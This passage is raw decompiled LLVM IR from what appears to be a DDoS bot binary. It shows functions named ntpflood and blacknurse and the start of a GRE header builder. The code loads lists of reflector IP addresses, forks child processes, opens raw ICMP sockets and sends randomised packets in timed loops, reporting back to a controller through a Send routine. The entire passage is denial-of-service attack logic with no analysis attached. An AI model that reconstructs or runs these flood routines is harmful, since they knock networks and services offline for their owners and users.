  %v2_10004cac = load i8, i8* %v1_10004cac, align 1
  %v3_10004cb4 = icmp eq i8 %v2_10004cac, 10
  br i1 %v3_10004cb4, label %dec_label_pc_10004ce8, label %dec_label_pc_10004cbc

dec_label_pc_10004cbc:                            ; preds = %dec_label_pc_10004c90
  store i32 %v0_10004c0c, i32* @r3, align 4
  %v0_10004cc0 = call i32 @__GI_strlen()
  %v1_10004cd4 = add i32 %v0_10004cc0, %v2_10004ca4
  store i32 %v1_10004cd4, i32* %r9.global-to-local, align 4
  %v1_10004cd8 = inttoptr i32 %v1_10004cd4 to i8*
  %v2_10004cd8 = load i8, i8* %v1_10004cd8, align 1
  %v3_10004ce0 = icmp eq i8 %v2_10004cd8, 13
  br i1 %v3_10004ce0, label %dec_label_pc_10004ce8, label %dec_label_pc_10004e1c

dec_label_pc_10004ce8:                            ; preds = %dec_label_pc_10004cbc, %dec_label_pc_10004c90
  store i32 %v0_10004c0c, i32* @r3, align 4
  %v0_10004cec = call i32 @__GI_strlen()
  %v1_10004d00 = add i32 %v0_10004cec, %v2_10004ca4
  %v3_10004d08 = inttoptr i32 %v1_10004d00 to i8*
  store i8 0, i8* %v3_10004d08, align 1
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10004d10 = load i32, i32* @global_var_10045194.105, align 4
  %v3_10004d14 = icmp eq i32 %v3_10004d10, 0
  store i32 540, i32* @r3, align 4
  br i1 %v3_10004d14, label %dec_label_pc_10004d1c, label %dec_label_pc_10004da0

dec_label_pc_10004d1c:                            ; preds = %dec_label_pc_10004ce8
  store i32 268455204, i32* @lr, align 4
  %v0_10004d20 = call i32 @malloc()
  store i32 %v0_10004d20, i32* @global_var_10045194.105, align 4
  store i32 %v0_10004d20, i32* %r9.global-to-local, align 4
  %v2_10004d40 = inttoptr i32 %v0_10004d20 to i32*
  store i32 0, i32* %v2_10004d40, align 4
  %v1_10004d48 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004d48 = add i32 %v1_10004d48, 4
  %v3_10004d48 = inttoptr i32 %v2_10004d48 to i32*
  store i32 0, i32* %v3_10004d48, align 4
  %v1_10004d50 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004d50 = add i32 %v1_10004d50, 8
  %v3_10004d50 = inttoptr i32 %v2_10004d50 to i32*
  store i32 0, i32* %v3_10004d50, align 4
  %v1_10004d58 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004d58 = add i32 %v1_10004d58, 12
  %v3_10004d58 = inttoptr i32 %v2_10004d58 to i32*
  store i32 0, i32* %v3_10004d58, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10004d60 = load i32, i32* @global_var_10045194.105, align 4
  store i32 268455276, i32* @lr, align 4
  %v1_10004d68 = call i32 @inet_addr(i32 %v0_10004c0c)
  %v2_10004d70 = add i32 %v3_10004d60, 4
  %v3_10004d70 = inttoptr i32 %v2_10004d70 to i32*
  store i32 %v1_10004d68, i32* %v3_10004d70, align 4
  %v3_10004d78 = load i32, i32* @global_var_10045194.105, align 4
  %v2_10004d84 = add i32 %v3_10004d78, 532
  %v3_10004d84 = inttoptr i32 %v2_10004d84 to i32*
  store i32 %v3_10004d78, i32* %v3_10004d84, align 4
  %v3_10004d8c = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10004d8c, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10004d98 = add i32 %v3_10004d8c, 536
  %v3_10004d98 = inttoptr i32 %v2_10004d98 to i32*
  store i32 %v3_10004d8c, i32* %v3_10004d98, align 4
  br label %dec_label_pc_10004e10

dec_label_pc_10004da0:                            ; preds = %dec_label_pc_10004ce8
  store i32 268455336, i32* @lr, align 4
  %v0_10004da4 = call i32 @malloc()
  store i32 540, i32* %r9.global-to-local, align 4
  store i32 %v0_10004da4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 540, i32* @r5, align 4
  store i32 268455368, i32* @lr, align 4
  %v0_10004dc4 = call i32 @__GI_memset()
  store i32 268455376, i32* @lr, align 4
  %v1_10004dcc = call i32 @inet_addr(i32 %v0_10004c0c)
  %v2_10004dd8 = add i32 %v0_10004da4, 4
  %v3_10004dd8 = inttoptr i32 %v2_10004dd8 to i32*
  store i32 %v1_10004dcc, i32* %v3_10004dd8, align 4
  %v3_10004de0 = load i32, i32* @global_var_10045194.105, align 4
  %v2_10004de8 = add i32 %v0_10004da4, 536
  %v3_10004de8 = inttoptr i32 %v2_10004de8 to i32*
  store i32 %v3_10004de0, i32* %v3_10004de8, align 4
  %v3_10004df0 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10004df0, i32* %r9.global-to-local, align 4
  %v1_10004df4 = add i32 %v3_10004df0, 532
  %v2_10004df4 = inttoptr i32 %v1_10004df4 to i32*
  %v3_10004df4 = load i32, i32* %v2_10004df4, align 4
  %v2_10004dfc = add i32 %v0_10004da4, 532
  %v3_10004dfc = inttoptr i32 %v2_10004dfc to i32*
  store i32 %v3_10004df4, i32* %v3_10004dfc, align 4
  %v3_10004e04 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10004e04, i32* %r9.global-to-local, align 4
  %v2_10004e0c = add i32 %v3_10004e04, 532
  %v3_10004e0c = inttoptr i32 %v2_10004e0c to i32*
  store i32 %v0_10004da4, i32* %v3_10004e0c, align 4
  br label %dec_label_pc_10004e10

dec_label_pc_10004e10:                            ; preds = %dec_label_pc_10004d1c, %dec_label_pc_10004da0
  store i32 %stack_var_-1096.0.ph, i32* %r9.global-to-local, align 4
  %v1_10004e14 = add i32 %stack_var_-1096.0.ph, 1
  br label %dec_label_pc_10004e1c.outer

dec_label_pc_10004e1c.outer:                      ; preds = %dec_label_pc_10004e10, %dec_label_pc_10004b3c
  %stack_var_-1096.0.ph = phi i32 [ %v1_10004e14, %dec_label_pc_10004e10 ], [ 0, %dec_label_pc_10004b3c ]
  br label %dec_label_pc_10004e1c

dec_label_pc_10004e1c:                            ; preds = %dec_label_pc_10004e1c.outer, %dec_label_pc_10004cbc
  store i32 268455468, i32* @lr, align 4
  %v3_10004e28 = call i32 @fgets(i32 %v0_10004c0c, i32 128, i32 %v3_10004c80)
  %v3_10004e30 = icmp eq i32 %v3_10004e28, 0
  br i1 %v3_10004e30, label %dec_label_pc_10004e38, label %dec_label_pc_10004c90

dec_label_pc_10004e38:                            ; preds = %dec_label_pc_10004e1c
  %v3_10004e3c = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10004e3c, i32* %r9.global-to-local, align 4
  %v1_10004e40 = add i32 %v3_10004e3c, 532
  %v2_10004e40 = inttoptr i32 %v1_10004e40 to i32*
  %v3_10004e40 = load i32, i32* %v2_10004e40, align 4
  %v1_10004e54 = add i32 %arg4, 4
  store i32 %v1_10004e54, i32* %r9.global-to-local, align 4
  %v1_10004e58 = inttoptr i32 %v1_10004e54 to i32*
  %v2_10004e58 = load i32, i32* %v1_10004e58, align 4
  store i32 268455524, i32* @lr, align 4
  %v1_10004e60 = call i32 @inet_addr(i32 %v2_10004e58)
  %v1_10004e70 = mul i32 %v1_10004c28, 28
  %v1_10004e78 = add i32 %v1_10004e70, 30
  %v1_10004e7c = and i32 %v1_10004e78, -16
  %v2_10004e84 = load i32, i32* %stack_var_-1136, align 4
  %v1_10004e8c = load i32, i32* @r1, align 4
  %v3_10004e8c = sub i32 %v1_10004e8c, %v1_10004e7c
  %v4_10004e8c = inttoptr i32 %v3_10004e8c to i32*
  store i32 %v2_10004e84, i32* %v4_10004e8c, align 4
  %v1_10004e9c = add i32 %v3_10004e8c, 23
  %v1_10004ea0 = and i32 %v1_10004e9c, -16
  store i32 %v1_10004c28, i32* %r9.global-to-local, align 4
  %v2_10004f504 = icmp sgt i32 %v1_10004c28, 0
  br i1 %v2_10004f504, label %dec_label_pc_10004ec0, label %dec_label_pc_10004f58

dec_label_pc_10004ec0:                            ; preds = %dec_label_pc_10004e38, %dec_label_pc_10004ec0
  %storemerge27 = phi i32 [ %v1_10004f40, %dec_label_pc_10004ec0 ], [ 0, %dec_label_pc_10004e38 ]
  %v1_10004ec8 = mul i32 %storemerge27, 28
  %v2_10004ecc = add i32 %v1_10004ec8, %v1_10004ea0
  %v2_10004ed4 = inttoptr i32 %v2_10004ecc to i32*
  store i32 %storemerge27, i32* %v2_10004ed4, align 4
  store i32 %v2_10004ecc, i32* %r9.global-to-local, align 4
  store i32 %v1_10004e60, i32* %r11.global-to-local, align 4
  %v2_10004ef8 = add i32 %v2_10004ecc, 8
  %v3_10004ef8 = inttoptr i32 %v2_10004ef8 to i32*
  store i32 2, i32* %v3_10004ef8, align 4
  %v0_10004efc = load i32, i32* %r11.global-to-local, align 4
  %v1_10004efc = load i32, i32* %r9.global-to-local, align 4
  %v2_10004efc = add i32 %v1_10004efc, 12
  %v3_10004efc = inttoptr i32 %v2_10004efc to i32*
  store i32 %v0_10004efc, i32* %v3_10004efc, align 4
  %v0_10004f00 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004f00 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004f00 = add i32 %v1_10004f00, 16
  %v3_10004f00 = inttoptr i32 %v2_10004f00 to i32*
  store i32 %v0_10004f00, i32* %v3_10004f00, align 4
  %v1_10004f04 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004f04 = add i32 %v1_10004f04, 20
  %v3_10004f04 = inttoptr i32 %v2_10004f04 to i32*
  store i32 %tmp, i32* %v3_10004f04, align 4
  %v1_10004f18 = add i32 %v2_10004ecc, 4
  %v2_10004f20 = inttoptr i32 %v1_10004f18 to i32*
  store i32 %v3_10004e40, i32* %v2_10004f20, align 4
  store i32 %v1_10004ea0, i32* %r9.global-to-local, align 4
  %v3_10004f38 = call i32 @ntpflood(i32 %v2_10004ecc, i32 %tmp, i32 %v1_10004ea0)
  %v1_10004f40 = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10004c28, i32* %r9.global-to-local, align 4
  %v2_10004f50 = icmp slt i32 %v1_10004f40, %v1_10004c28
  br i1 %v2_10004f50, label %dec_label_pc_10004ec0, label %dec_label_pc_10004f58

dec_label_pc_10004f58:                            ; preds = %dec_label_pc_10004ec0, %dec_label_pc_10004e38
  store i32 %v1_10004e54, i32* %r9.global-to-local, align 4
  %v2_10004f60 = load i32, i32* %v1_10004e58, align 4
  %v1_10004f68 = add i32 %arg4, 8
  store i32 %v1_10004f68, i32* %r9.global-to-local, align 4
  %v1_10004f6c = inttoptr i32 %v1_10004f68 to i32*
  %v2_10004f6c = load i32, i32* %v1_10004f6c, align 4
  store i32 %v2_10004f6c, i32* %r11.global-to-local, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v7_10004f8c = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1002ab4c.260 to i32), i32 %arg2, i32 %v2_10004f60)
  %v1_10005074 = add i32 %arg4, 24
  %v1_10005078 = inttoptr i32 %v1_10005074 to i32*
  br label %dec_label_pc_10005070

dec_label_pc_10004f9c:                            ; preds = %dec_label_pc_10005070
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268455860, i32* @lr, align 4
  %v1_10004fb0 = call i32 @usleep(i32 50000)
  %v3_10004fb8 = load i32, i32* @global_var_1004518c.119, align 4
  %v2_10004fc0 = mul i32 %v3_10004fb8, 20
  %v3_10004fc8 = icmp ugt i32 %v2_10004fc0, %v1_10004c44
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10004fd4 = load i32, i32* @global_var_10045174.120, align 4
  br i1 %v3_10004fc8, label %dec_label_pc_10004fd0, label %dec_label_pc_10005010

dec_label_pc_10004fd0:                            ; preds = %dec_label_pc_10004f9c
  %v2_10004fd8 = icmp sgt i32 %v3_10004fd4, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_10004fd8, label %dec_label_pc_10004ff8, label %dec_label_pc_10004fe0

dec_label_pc_10004fe0:                            ; preds = %dec_label_pc_10004fd0
  %v3_10004fe4 = load i32, i32* @global_var_100450b4.121, align 4
  %v1_10004fe8 = add i32 %v3_10004fe4, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10004fe8, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10005058

dec_label_pc_10004ff8:                            ; preds = %dec_label_pc_10004fd0
  %v1_10005000 = add i32 %v3_10004fd4, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10005000, i32* @global_var_10045174.120, align 4
  br label %dec_label_pc_10005058

dec_label_pc_10005010:                            ; preds = %dec_label_pc_10004f9c
  %v1_10005018 = add i32 %v3_10004fd4, 1
  store i32 %v1_10005018, i32* @global_var_10045174.120, align 4
  %v3_10005028 = load i32, i32* @global_var_100450b4.121, align 4
  %tmp38 = icmp ult i32 %v3_10005028, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp38, label %dec_label_pc_1000504c, label %dec_label_pc_10005034

dec_label_pc_10005034:                            ; preds = %dec_label_pc_10005010
  %v1_1000503c = add i32 %v3_10005028, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_1000503c, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10005058

dec_label_pc_1000504c:                            ; preds = %dec_label_pc_10005010
  store i32 0, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10005058

dec_label_pc_10005058:                            ; preds = %dec_label_pc_10005034, %dec_label_pc_10004ff8, %dec_label_pc_10004fe0, %dec_label_pc_1000504c
  store i32 0, i32* @global_var_1004518c.119, align 4
  store i32 %storemerge3, i32* %r9.global-to-local, align 4
  %v1_10005068 = add i32 %storemerge3, 1
  br label %dec_label_pc_10005070

dec_label_pc_10005070:                            ; preds = %dec_label_pc_10004f58, %dec_label_pc_10005058
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10004f58 ], [ %v1_10005068, %dec_label_pc_10005058 ]
  store i32 %v1_10005074, i32* %r9.global-to-local, align 4
  %v2_10005078 = load i32, i32* %v1_10005078, align 4
  store i32 268456068, i32* @lr, align 4
  %v1_10005080 = call i32 @atol(i32 %v2_10005078)
  %v2_1000508c = mul i32 %v1_10005080, 20
  store i32 %v2_1000508c, i32* %r9.global-to-local, align 4
  %v3_10005094 = icmp sgt i32 %v2_1000508c, %storemerge3
  br i1 %v3_10005094, label %dec_label_pc_10004f9c, label %dec_label_pc_1000509c

dec_label_pc_1000509c:                            ; preds = %dec_label_pc_10005070
  %v0_100050a0 = call i32 @__GI_exit()
  br label %dec_label_pc_100050a4

dec_label_pc_100050a4:                            ; preds = %entry, %dec_label_pc_10004b0c, %dec_label_pc_1000509c
  %v0_100050d0 = phi i32 [ %v1_10004aa4, %entry ], [ %v0_10004b1c, %dec_label_pc_10004b0c ], [ %v0_100050a0, %dec_label_pc_1000509c ]
  %v2_100050a4 = load i32, i32* %stack_var_-1136, align 4
  store i32 %v5_10004a6c, i32* %r9.global-to-local, align 4
  store i32 %v2_100050a4, i32* %r11.global-to-local, align 4
  ret i32 %v0_100050d0

; uselistorder directives
  uselistorder i32 %storemerge3, { 2, 0, 1 }
  uselistorder i32 %v3_10004fd4, { 1, 0, 2 }
  uselistorder i32 %v1_10005074, { 1, 0 }
  uselistorder i32 %v1_10004f40, { 1, 0 }
  uselistorder i32 %v2_10004ecc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %storemerge27, { 2, 1, 0 }
  uselistorder i32 %v1_10004ea0, { 2, 1, 0 }
  uselistorder i32 %stack_var_-1096.0.ph, { 1, 0 }
  uselistorder i32 %v3_10004d8c, { 1, 0, 2 }
  uselistorder i32 %v3_10004d78, { 1, 0 }
  uselistorder i32 %v1_10004c28, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10004c0c, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_10004b7c, { 1, 0, 2 }
  uselistorder i32 %v2_10004b6c, { 1, 0 }
  uselistorder i32 %v1_10004b28, { 2, 1, 0, 3, 4 }
  uselistorder i32* %v1_10004b14, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_10004b10, { 0, 2, 1, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-1136, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 9, 11, 2, 4, 3, 5, 6, 7, 8, 10, 12, 13, 14, 20, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100050a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005070, { 1, 0 }
  uselistorder label %dec_label_pc_10005058, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10004ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10004e10, { 1, 0 }
  uselistorder label %dec_label_pc_10004b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10004ae0, { 1, 0 }
}

define i32 @blacknurse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v2_10005104 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_10005104, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002ab70.262 to i32), i32* @r4, align 4
  store i32 36, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000511c.263 to i32), i32* @lr, align 4
  %v0_10005118 = call i32 @memcpy()
  store i32 268456236, i32* @lr, align 4
  %v1_10005128 = call i32 @__GI_time(i32 0)
  %v1_10005138 = call i32 @mfork(i32 %arg2)
  %v3_10005140 = icmp eq i32 %v1_10005138, 0
  br i1 %v3_10005140, label %dec_label_pc_10005148, label %dec_label_pc_100053dc

dec_label_pc_10005148:                            ; preds = %entry
  store i32 268456280, i32* @lr, align 4
  %v3_10005154 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp34 = icmp sgt i32 %v3_10005154, -1
  br i1 %tmp34, label %dec_label_pc_10005174, label %dec_label_pc_1000516c

dec_label_pc_1000516c:                            ; preds = %dec_label_pc_10005148
  %v0_10005170 = call i32 @__GI_exit()
  br label %dec_label_pc_10005174

dec_label_pc_10005174:                            ; preds = %dec_label_pc_10005148, %dec_label_pc_1000516c
  %v2_10005178 = icmp sgt i32 %arg3, 1
  br i1 %v2_10005178, label %dec_label_pc_100051a0, label %dec_label_pc_10005180

dec_label_pc_10005180:                            ; preds = %dec_label_pc_10005174
  %v6_10005194 = call i32 @Send(i32 %arg1, i32 ptrtoint ([41 x i8]* @global_var_1002ab94.264 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000519c = call i32 @__GI_exit()
  br label %dec_label_pc_100051a0

dec_label_pc_100051a0:                            ; preds = %dec_label_pc_10005174, %dec_label_pc_10005180
  %v1_100051a4 = add i32 %arg4, 4
  %v1_100051a8 = inttoptr i32 %v1_100051a4 to i32*
  %v2_100051a8 = load i32, i32* %v1_100051a8, align 4
  %v1_100051b4 = add i32 %arg4, 8
  %v1_100051b8 = inttoptr i32 %v1_100051b4 to i32*
  %v2_100051b8 = load i32, i32* %v1_100051b8, align 4
  store i32 268456388, i32* @lr, align 4
  %v1_100051c0 = call i32 @atol(i32 %v2_100051b8)
  %v2_100051cc = ptrtoint i32* %stack_var_-88 to i32
  store i32 0, i32* %stack_var_-88, align 4
  %v2_1000521c = ptrtoint i32* %stack_var_-92 to i32
  store i32 268456500, i32* @lr, align 4
  %v5_10005230 = inttoptr i32 %v2_100051a8 to i8*
  %v6_10005230 = call i32 @getaddrinfo(i8* %v5_10005230, i32 0, i32 %v2_100051cc, i32 %v2_1000521c, i32 %v2_1000521c)
  %v3_10005240 = icmp eq i32 %v6_10005230, 0
  br i1 %v3_10005240, label %dec_label_pc_10005250, label %dec_label_pc_10005248

dec_label_pc_10005248:                            ; preds = %dec_label_pc_100051a0
  %v0_1000524c = call i32 @__GI_exit()
  br label %dec_label_pc_10005250

dec_label_pc_10005250:                            ; preds = %dec_label_pc_100051a0, %dec_label_pc_10005248
  store i32 268456544, i32* @lr, align 4
  %v3_1000525c = call i32 @socket(i32 2, i32 3, i32 1)
  %v4_10005270 = icmp eq i32 %v3_1000525c, -1
  br i1 %v4_10005270, label %dec_label_pc_10005278, label %dec_label_pc_1000528c

dec_label_pc_10005278:                            ; preds = %dec_label_pc_10005250
  store i32 ptrtoint ([7 x i8]* @global_var_1002abc0.267 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005284.268 to i32), i32* @lr, align 4
  %v0_10005280 = call i32 @perror()
  %v0_10005288 = call i32 @__GI_exit()
  br label %dec_label_pc_1000528c

dec_label_pc_1000528c:                            ; preds = %dec_label_pc_10005250, %dec_label_pc_10005278
  %v6_100052a4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1002abc8.269 to i32), i32 %arg2, i32 %v2_100051a8)
  store i32 %v3_1000525c, i32* %stack_var_-56, align 4
  %v2_10005354 = ptrtoint i32* %stack_var_-56 to i32
  %v2_100053b0 = add i32 %v1_100051c0, %v1_10005128
  br label %dec_label_pc_100052c4.outer

dec_label_pc_100052c4.outer:                      ; preds = %dec_label_pc_100053cc, %dec_label_pc_1000528c
  %stack_var_-156.0.ph = phi i32 [ %v1_100053d0, %dec_label_pc_100053cc ], [ %tmp, %dec_label_pc_1000528c ]
  br label %dec_label_pc_100052c4

dec_label_pc_100052c4:                            ; preds = %dec_label_pc_100052c4.outer, %dec_label_pc_10005354
  br label %dec_label_pc_100052d0

dec_label_pc_100052d0:                            ; preds = %dec_label_pc_100052c4, %dec_label_pc_100052d0
  %storemerge12 = phi i32 [ 20, %dec_label_pc_100052c4 ], [ %v1_100052f0, %dec_label_pc_100052d0 ]
  store i32 268456672, i32* @lr, align 4
  %v0_100052dc = call i32 @random()
  %v1_100052e8 = trunc i32 %v0_100052dc to i8
  %v2_100052e8 = load i32, i32* @r29, align 4
  %v3_100052e8 = inttoptr i32 %v2_100052e8 to i8*
  store i8 %v1_100052e8, i8* %v3_100052e8, align 1
  %v1_100052f0 = add nuw nsw i32 %storemerge12, 1
  %tmp35 = icmp ult i32 %v1_100052f0, 32
  br i1 %tmp35, label %dec_label_pc_100052d0, label %dec_label_pc_10005304

dec_label_pc_10005304:                            ; preds = %dec_label_pc_100052d0
  %v3_10005304 = load i32, i32* %stack_var_-92, align 4
  %v1_10005308 = add i32 %v3_10005304, 20
  %v2_10005308 = inttoptr i32 %v1_10005308 to i32*
  %v3_10005308 = load i32, i32* %v2_10005308, align 4
  %v1_10005310 = add i32 %v3_10005304, 16
  %v2_10005310 = inttoptr i32 %v1_10005310 to i32*
  %v3_10005310 = load i32, i32* %v2_10005310, align 4
  store i32 268456752, i32* @lr, align 4
  %v6_1000532c = call i32 @sendto(i32 %v3_1000525c, i32 %v2_10005104, i32 36, i32 0, i32 %v3_10005308, i32 %v3_10005310)
  %v4_10005338 = icmp eq i32 %v6_1000532c, 36
  br i1 %v4_10005338, label %dec_label_pc_10005390, label %dec_label_pc_10005340

dec_label_pc_10005340:                            ; preds = %dec_label_pc_10005304
  %v0_10005340 = call i32 @__errno_location()
  %v1_10005348 = inttoptr i32 %v0_10005340 to i32*
  %v2_10005348 = load i32, i32* %v1_10005348, align 4
  %v3_1000534c = icmp eq i32 %v2_10005348, 105
  br i1 %v3_1000534c, label %dec_label_pc_10005354, label %dec_label_pc_1000536c

dec_label_pc_10005354:                            ; preds = %dec_label_pc_10005340
  store i32 268456808, i32* @lr, align 4
  %v3_10005364 = call i32 @__libc_poll(i32 %v2_10005354, i32 1, i32 1000)
  br label %dec_label_pc_100052c4

dec_label_pc_1000536c:                            ; preds = %dec_label_pc_10005340
  store i32 ptrtoint ([7 x i8]* @global_var_1002abe4.270 to i32), i32* @r3, align 4
  store i32 268456824, i32* @lr, align 4
  %v0_10005374 = call i32 @perror()
  store i32 268456832, i32* @lr, align 4
  %v1_1000537c = call i32 @close(i32 %v3_1000525c)
  %v3_10005380 = load i32, i32* %stack_var_-92, align 4
  store i32 ptrtoint (i32* @global_var_1000538c.271 to i32), i32* @lr, align 4
  %v1_10005388 = call i32 @freeaddrinfo(i32 %v3_10005380)
  br label %dec_label_pc_100053dc

dec_label_pc_10005390:                            ; preds = %dec_label_pc_10005304
  %tmp36 = icmp slt i32 %stack_var_-156.0.ph, 100
  br i1 %tmp36, label %dec_label_pc_100053cc, label %dec_label_pc_1000539c

dec_label_pc_1000539c:                            ; preds = %dec_label_pc_10005390
  store i32 268456868, i32* @lr, align 4
  %v1_100053a0 = call i32 @__GI_time(i32 0)
  %v2_100053b4 = icmp slt i32 %v1_100053a0, %v2_100053b0
  br i1 %v2_100053b4, label %dec_label_pc_100053c4, label %dec_label_pc_100053bc

dec_label_pc_100053bc:                            ; preds = %dec_label_pc_1000539c
  %v0_100053c0 = call i32 @__GI_exit()
  br label %dec_label_pc_100053c4

dec_label_pc_100053c4:                            ; preds = %dec_label_pc_1000539c, %dec_label_pc_100053bc
  br label %dec_label_pc_100053cc

dec_label_pc_100053cc:                            ; preds = %dec_label_pc_10005390, %dec_label_pc_100053c4
  %stack_var_-156.1 = phi i32 [ %stack_var_-156.0.ph, %dec_label_pc_10005390 ], [ 0, %dec_label_pc_100053c4 ]
  %v1_100053d0 = add i32 %stack_var_-156.1, 1
  br label %dec_label_pc_100052c4.outer

dec_label_pc_100053dc:                            ; preds = %entry, %dec_label_pc_1000536c
  %v0_100053f4 = phi i32 [ %v1_10005138, %entry ], [ %v1_10005388, %dec_label_pc_1000536c ]
  ret i32 %v0_100053f4

; uselistorder directives
  uselistorder i32 %stack_var_-156.0.ph, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100053dc, { 1, 0 }
  uselistorder label %dec_label_pc_100053cc, { 1, 0 }
  uselistorder label %dec_label_pc_100053c4, { 1, 0 }
  uselistorder label %dec_label_pc_100052d0, { 1, 0 }
  uselistorder label %dec_label_pc_100052c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000528c, { 1, 0 }
  uselistorder label %dec_label_pc_10005250, { 1, 0 }
  uselistorder label %dec_label_pc_100051a0, { 1, 0 }
  uselistorder label %dec_label_pc_10005174, { 1, 0 }
}

define i32 @setup_gre_ip_header(i32* %arg1) local_unnamed_addr {
entry:
  store i32 21, i32* @global_var_100451a8.273, align 4
  %v1_1000545c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_1000545c, i32* inttoptr (i32 1 to i32*), align 4
  %v1_10005470 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10005470, i32* inttoptr (i32 1 to i32*), align 4
  store i8 0, i8* inttoptr (i32 2 to i8*), align 2
  store i32 268457104, i32* @lr, align 4
  %v2_1000548c = call i32 @realrand(i32 1, i32 255)
  store i32 268457120, i32* @lr, align 4
  %v2_1000549c = call i32 @realrand(i32 1, i32 255)
  store i32 268457136, i32* @lr, align 4
  %v2_100054ac = call i32 @realrand(i32 1, i32 255)
  store i32 268457152, i32* @lr, align 4
  %v2_100054bc = call i32 @realrand(i32 1, i32 255)
  store i32 ptrtoint (i32* @global_var_1004ed78.274 to i32), i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32* @r5, align 4
  %v0_100054d8 = load i32, i32* @r29, align 4
  %v0_100054dc = load i32, i32* @r28, align 4
  %v0_100054e0 = load i32, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100054f0.276 to i32), i32* @lr, align 4
  %v9_100054ec = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_1004ed78.274 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32 %v0_100054d8, i32 %v0_100054dc, i32 %v0_100054e0, i32 %v2_100054bc, i32 ptrtoint (i32* @0 to i32))
  store i32 268457212, i32* @lr, align 4
  %v2_100054f8 = call i32 @realrand(i32 1, i32 255)
  store i32 268457228, i32* @lr, align 4
  %v2_10005508 = call i32 @realrand(i32 1, i32 255)
  store i32 268457244, i32* @lr, align 4
  %v2_10005518 = call i32 @realrand(i32 1, i32 255)
  store i32 268457260, i32* @lr, align 4
  %v2_10005528 = call i32 @realrand(i32 1, i32 255)
  store i32 ptrtoint (i32* @global_var_1004dc50.277 to i32), i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32* @r5, align 4
  %v0_10005544 = load i32, i32* @r29, align 4
  %v0_10005548 = load i32, i32* @r28, align 4
  %v0_1000554c = load i32, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000555c.278 to i32), i32* @lr, align 4
  %v9_10005558 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_1004dc50.277 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32 %v0_10005544, i32 %v0_10005548, i32 %v0_1000554c, i32 %v2_10005528, i32 ptrtoint (i32* @0 to i32))
